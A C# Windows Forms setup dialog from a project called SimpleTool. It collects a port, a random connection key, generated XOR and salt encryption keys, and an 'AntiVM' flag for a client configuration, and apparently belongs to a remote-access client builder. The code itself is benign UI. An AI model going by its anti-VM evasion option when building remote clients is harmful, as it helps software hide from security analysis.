using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SimpleTool.Configs;
using SimpleTool.Lists;
using SimpleTool.Tools;

namespace SimpleTool.ToolWindows
{
    public partial class InitialSetup : Form
    {
        public InitialSetup()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void txtPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
            }
        }

        private void btnGenerateConKey_Click(object sender, EventArgs e)
        {
            txtConKey.Text = Rando.RandomString(50); // 50 characters long
        }

        private void btnGenerateKeys_Click(object sender, EventArgs e)
        {
            CryptoTool crypt = new CryptoTool();
            // Generate 10 keys by default
            for (var x = 0; x < 10; x++)
            {
                EncryptionKeys key = new EncryptionKeys();
                key.Password = crypt.CreatePassSalt(256);
                key.Salt = crypt.CreatePassSalt(15);
                key.XorKey = crypt.CreateXOR_Pass(Rando.GetNumber(256).ToString()); // instead of a username we'll just use int for XOR key
                // We'll leave the VI alone
                ClientConfig.EncryptionKeys.Add(key); // Add to client key list
            }
        }

        private void btnSetupDone_Click(object sender, EventArgs e)
        {
            ClientConfig.AntiVM = chkVM.Checked;
            ClientConfig.Debug = chkDebug.Checked;
            ClientConfig.Port = Convert.ToInt32(txtPort.Text);
            ClientConfig.connectionKey = txtConKey.Text;
            this.Close();
        }

        private void chkVM_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
